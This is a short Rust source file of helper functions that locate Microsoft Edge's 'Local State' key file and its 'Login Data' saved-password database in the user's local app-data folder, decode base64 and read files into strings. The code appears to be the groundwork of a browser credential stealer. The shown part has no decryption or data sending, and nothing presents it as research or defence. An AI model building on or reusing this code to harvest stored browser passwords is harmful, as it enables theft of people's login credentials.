use base64::engine::general_purpose;
use base64::Engine;

use std::fs;

const EDGE_STATE_PATH: &str = "\\Microsoft\\Edge\\User Data\\Local State";
const EDGE_DB_PATH: &str = "\\Microsoft\\Edge\\User Data\\Default\\Login Data";

pub fn base64_decode(encode_str: &str) -> Result<String, base64::DecodeError>
{
    let decode_bytes = general_purpose::STANDARD.decode(encode_str).unwrap();
    let chars: String = decode_bytes.into_iter().map(|c| c as char).collect();
    Ok(chars)
}

pub fn get_app_data_path() -> String
{
    if let Some(app_data_path) = dirs_2::data_local_dir() {
        if let Some(path_str) = app_data_path.to_str() {
            return path_str.to_string();
        } else {
            eprintln!("Path conversion error");
        }
    } else {
        eprintln!("Local Data directory path not found");
    }

    String::new() // Return an empty string in case of an error
}

pub fn get_local_state_path() -> String
{
    let app_data_path = get_app_data_path(); // Call the function without Result
    let local_state_path = format!("{}{}", app_data_path, EDGE_STATE_PATH);
    local_state_path
}

pub fn get_db_path() -> String
{
    let app_data_path = get_app_data_path();
    let db_path = format!("{}{}", app_data_path, EDGE_DB_PATH);
    db_path
}

pub fn read_file_to_string(file_path: String) -> String
{
    match fs::read_to_string(file_path) {
        Ok(content) => content,
        Err(error) => {
            eprintln!("Error reading file: {}", error);
            String::new() // Return an empty string in case of an error
        }
    }
}